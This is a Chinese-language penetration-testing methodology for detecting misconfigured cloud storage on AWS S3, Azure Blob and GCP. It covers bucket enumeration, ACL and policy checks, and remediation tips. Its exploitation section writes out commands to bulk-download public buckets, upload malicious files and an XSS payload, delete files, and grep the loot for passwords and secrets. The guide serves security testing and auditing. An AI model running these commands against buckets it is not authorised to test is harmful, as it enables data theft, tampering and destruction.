# 云权限检测方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对云存储（AWS S3、Azure Blob、GCP Storage 等）权限配置错误的检测方法论。

### 1.2 适用范围
- AWS S3 存储桶
- Azure Blob Storage
- Google Cloud Storage
- 阿里云 OSS
- 腾讯云 COS

### 1.3 读者对象
- 渗透测试工程师
- 云安全审计人员
- 红队成员

---

## 第二部分：核心检测技术专题

### 专题：云存储权限检测

#### 2.1 技术介绍

云存储权限检测是指识别和验证云存储桶（Bucket/Container）的访问权限配置，发现公开访问、未授权读写等安全问题。

**常见配置错误：**
- 存储桶公开读取
- 存储桶公开写入
- ACL 配置过于宽松
- CORS 配置不当
- 缺少加密配置

#### 2.2 AWS S3 权限检测

##### 2.2.1 存储桶枚举

```bash
# 常见命名模式
# - company-name
# - company-name-assets
# - company-name-backup
# - company-name-uploads
# - company-name-dev
# - company-name-prod

# 使用 S3Scanner
s3scanner scan company-name

# 使用 aws-cli 枚举
aws s3 ls s3://company-name --no-sign-request
aws s3 ls s3://company-name-assets --no-sign-request
aws s3 ls s3://company-name-backup --no-sign-request

# 使用 bucket-stream
bucket-stream company-name

# 使用 sluthound
sluthound -m s3 -t company-name
```

##### 2.2.2 权限检测

```bash
# 检查存储桶 ACL
aws s3api get-bucket-acl \
  --bucket target-bucket \
  --no-sign-request

# 检查存储桶策略
aws s3api get-bucket-policy \
  --bucket target-bucket \
  --no-sign-request

# 检查 CORS 配置
aws s3api get-bucket-cors \
  --bucket target-bucket \
  --no-sign-request

# 测试公开读取
aws s3 cp s3://target-bucket/file.txt ./downloaded.txt \
  --no-sign-request

# 测试公开写入
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test-write.txt \
  --no-sign-request
```

##### 2.2.3 自动化扫描

```bash
# S3Scanner
git clone https://github.com/sa7mon/S3Scanner
python s3scanner.py -f buckets.txt

# Prowler (AWS 安全审计)
git clone https://github.com/prowler-cloud/prowler
./prowler -M json

# ScoutSuite (多云审计)
git clone https://github.com/nccgroup/ScoutSuite
python scout.py aws --profile default
```

#### 2.3 Azure Blob 权限检测

##### 2.3.1 容器枚举

```bash
# Azure Blob URL 格式
https://<account>.blob.core.windows.net/<container>/<blob>

# 测试匿名访问
curl https://account.blob.core.windows.net/container/file.txt

# 枚举容器
https://account.blob.core.windows.net/?restype=container&comp=list

# 使用 Azure CLI
az storage container list \
  --account-name account \
  --auth-mode login
```

##### 2.3.2 权限检测

```bash
# 检查匿名访问级别
# 可能的值：
# - private: 需要认证
# - blob: 匿名读取 blob
# - container: 匿名读取 container 和 blob
# - account: 匿名读取整个账户

# 测试读取
curl https://account.blob.core.windows.net/container/file.txt

# 测试列出容器
curl "https://account.blob.core.windows.net/?restype=container&comp=list"
```

#### 2.4 GCP Storage 权限检测

##### 2.4.1 存储桶枚举

```bash
# GCS URL 格式
https://storage.googleapis.com/<bucket>/<object>
https://<bucket>.storage.googleapis.com/<object>

# 使用 gsutil
gsutil ls gs://bucket-name
gsutil ls -L gs://bucket-name  # 详细信息

# 测试公开访问
curl https://storage.googleapis.com/bucket-name/file.txt
```

##### 2.4.2 权限检测

```bash
# 检查 IAM 策略
gsutil iam get gs://bucket-name

# 检查 ACL
gsutil acl get gs://bucket-name/file.txt

# 测试公开读取
curl https://storage.googleapis.com/bucket-name/file.txt

# 测试公开写入
curl -X PUT -d "test" \
  https://storage.googleapis.com/bucket-name/test.txt
```

#### 2.5 漏洞利用方法

##### 2.5.1 数据泄露（公开读取）

```bash
# 列出存储桶内容
aws s3 ls s3://target-bucket --recursive --no-sign-request

# 下载所有文件
aws s3 cp s3://target-bucket/ ./downloaded/ \
  --recursive --no-sign-request

# 分析获取的数据
# 1. 用户上传文件 - 隐私泄露
# 2. 数据库备份 - 获取数据库内容
# 3. 配置文件 - 获取凭证
# 4. 日志文件 - 了解系统架构
```

##### 2.5.2 数据篡改（公开写入）

```bash
# 上传恶意文件
aws s3 cp malicious.html s3://target-bucket/ \
  --no-sign-request

# 上传 XSS Payload
echo '<script>alert(document.domain)</script>' > xss.html
aws s3 cp xss.html s3://target-bucket/xss.html \
  --no-sign-request

# 删除文件（DoS）
aws s3 rm s3://target-bucket/important-file.txt \
  --no-sign-request
```

##### 2.5.3 敏感数据分析

```bash
# 查找敏感文件
find ./downloaded -name "*.sql" -o -name "*.bak" -o -name "*.env" -o -name "*.config"

# 提取凭证
grep -r "password\|api_key\|secret" ./downloaded/

# 分析数据库备份
mysql -u root < backup.sql
```

---

## 第三部分：附录

### 3.1 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **S3Scanner** | S3 桶扫描 | `python s3scanner.py -f buckets.txt` |
| **Prowler** | AWS 审计 | `./prowler -M json` |
| **ScoutSuite** | 多云审计 | `python scout.py aws` |
| **bucket-stream** | S3 枚举 | `bucket-stream company` |
| **aws-cli** | AWS 命令行 | `aws s3 ls s3://bucket` |
| **gsutil** | GCS 命令行 | `gsutil ls gs://bucket` |
| **Azure CLI** | Azure 命令行 | `az storage container list` |

### 3.2 修复建议

1. **禁用公开访问** - 除非确实需要
2. **使用 IAM 策略** - 细粒度访问控制
3. **启用加密** - 静态和传输加密
4. **启用日志** - 记录所有访问
5. **定期审计** - 检查权限配置
6. **使用访问点** - 限制网络访问
7. **实施 MFA 删除** - 防止意外删除

---

**参考资源：**
- [AWS S3 Security](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security.html)
- [OWASP Cloud Security](https://owasp.org/www-project-cloud-security/)
- [CIS AWS Foundations Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)
